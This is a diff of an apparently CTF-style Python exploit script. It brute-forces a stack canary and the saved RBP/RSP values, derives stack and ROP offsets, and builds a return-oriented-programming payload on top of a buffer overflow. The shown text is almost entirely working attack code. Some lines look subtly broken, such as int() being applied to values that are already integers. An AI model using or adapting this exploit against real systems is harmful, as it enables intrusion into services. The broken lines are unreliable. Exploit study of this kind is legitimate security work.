@@ -75,39 +75,47 @@ class ROP():
 	_syscall_base	= 0x0000000000000b55
 
 	def __init__(self, ropOffset):
-		self._pop_RAX = _pop_RAX_base + ropOffset
-		self._pop_RBP = _pop_RBP_base + ropOffset
-		self._pop_RDI = _pop_RDI_base + ropOffset
-		self._pop_RDX = _pop_RDX_base + ropOffset
-		self._pop_RSI = _pop_RSI_base + ropOffset
-		self._pop_RSP = _pop_RSP_base + ropOffset
-		self._leave_ret = _leave_ret_base + ropOffset
-		self._syscall = _syscall_base + ropOffset
+		self._pop_RAX = self._pop_RAX_base + ropOffset
+		self._pop_RBP = self._pop_RBP_base + ropOffset
+		self._pop_RDI = self._pop_RDI_base + ropOffset
+		self._pop_RDX = self._pop_RDX_base + ropOffset
+		self._pop_RSI = self._pop_RSI_base + ropOffset
+		self._pop_RSP = self._pop_RSP_base + ropOffset
+		self._leave_ret = self._leave_ret_base + ropOffset
+		self._syscall = self._syscall_base + ropOffset
 
 def main():
 	_Payload = _Correct_User + "A".encode("utf-8") * 1024
 
 	## find canary and add it to the payload
-	_canary = brute_force(_Payload)
+	_canary = brute_force(_Payload)	
 	_Payload += _canary
+	test(_Payload)
 	_canary_hex = xor_me(reverse(_canary)).hex()
-	print("[+] Canary found: {0}".format(_canary_hex))
+	print("[+] Canary found: {0}".format(_canary.hex()))
 
 	## find RBP - used to calculate stack offset
 	_RBP = brute_force(_Payload)	
 	_RBP_hex = xor_me(reverse(_RBP)).hex()
 	print("[+] RBP found: {0}".format(_RBP_hex))
 
-	## testing calulations..
-	print("[!] hex math: 0000{0:x}".format(int(_RBP_hex,16) - int("1144",16)))
+	## find stack offset
+	_stack_offset = int(_RBP_hex,16) - int("478",16)
+	print("[*] stack offset: {0:x}".format(_stack_offset))
 
 	## find RSP - used to calculate ROP offset
 	_RSP = brute_force(_Payload + _RBP)	
 	_RSP_hex = xor_me(reverse(_RSP)).hex()
 	print("[+] RSP found: {0}".format(_RSP_hex))
 
-	## testing calulations..
-	print("[!] hex math: 0000{0:x}".format(int(_RSP_hex,16) - int("e5f",16)))
+	## find ROP offset
+	_rop_offset = int(_RSP_hex[0:13] + '000',16)
+	print("[*] rop offset: {0:x}".format(_rop_offset))
+
+	## make a ROP object and print one gadget
+	myRop = ROP(_rop_offset)
+	_Payload += struct.pack("Q", int(_stack_offset, 16))
+	_Payload += struct.pack("Q", int(myRop._leave_ret, 16))
 
 	## test run - should result in "Username found!"
 	test(_Payload)	
